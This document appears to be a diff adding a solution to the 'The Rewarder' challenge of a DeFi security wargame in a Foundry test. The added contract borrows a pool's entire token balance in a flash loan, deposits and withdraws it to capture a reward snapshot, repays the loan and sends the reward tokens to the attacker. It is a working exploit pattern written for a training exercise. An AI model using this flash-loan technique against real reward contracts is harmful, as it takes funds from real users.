@@ -10,6 +10,36 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+contract AttackTheRewarder {
+
+    address internal attacker;
+
+    TheRewarderPool internal pool;
+    FlashLoanerPool internal flashLoanerPool;
+    DamnValuableToken internal dvt;
+    RewardToken internal rewardToken;
+
+    constructor(address poolAddress, address flashLoanerPoolAddress, address dvtAddress, address attacker_, address rewardToken_) {
+        pool = TheRewarderPool(poolAddress);
+        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
+        dvt = DamnValuableToken(dvtAddress);
+        attacker = attacker_;
+        rewardToken = RewardToken(rewardToken_);
+    }
+
+    function attack() public {
+        flashLoanerPool.flashLoan(dvt.balanceOf(address(flashLoanerPool)));
+    }
+
+    function receiveFlashLoan(uint256 amount_) external {
+        dvt.approve(address(pool), amount_);
+        pool.deposit(amount_);
+        pool.withdraw(amount_);
+        dvt.transfer(address(flashLoanerPool), amount_);
+        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
+    }
+}
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -89,6 +119,18 @@ contract TheRewarder is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.warp(block.timestamp + 10 days);
+        console.log(theRewarderPool.isNewRewardsRound());
+
+        AttackTheRewarder attack = new AttackTheRewarder(
+            address(theRewarderPool),
+            address(flashLoanerPool),
+            address(dvt),
+            address(attacker),
+            address(theRewarderPool.rewardToken())
+        );
+
+        attack.attack();
 
         /** EXPLOIT END **/
         validation();
